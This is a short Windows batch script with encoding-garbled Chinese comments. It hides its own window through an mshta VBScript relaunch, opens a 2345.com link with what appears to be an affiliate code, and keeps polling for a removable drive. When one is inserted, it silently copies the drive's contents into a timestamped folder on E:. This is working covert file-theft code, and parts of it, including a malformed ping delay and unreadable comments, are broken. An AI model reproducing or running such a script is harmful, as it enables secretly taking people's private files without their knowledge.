@echo off 
rem ������������
start www.2345.com/?k920711
if not "%1"=="wkdxz" mshta vbscript:createobject("wscript.shell").run("""%~f0"" wkdxz",vbhide)(window.close)&&exit
:jianche
for %%i in (f g h i j k l m n) do (fsutil fsinfo drivetype %%i: | findstr "���ƶ�" >nul 2>nul && if exist %%i: set upan=%%i:)
if defined upan (call :zhaodao) else (ping 20 127.0.1>nul && call:jianche)
rem �ҵ�U�̺�����U�����xxx��E�̵�ǰʱ���������ļ����£�����������������ҵ�U�̺�Ҫ����Ķ���

:zhaodao
start www.2345.com/?k920711
set T=%date:~2,8%-%time:~0,2%%time:~3,2%%time:~6,2%
md "E:\%T%"
copy "%upan%\" "E:\%T%"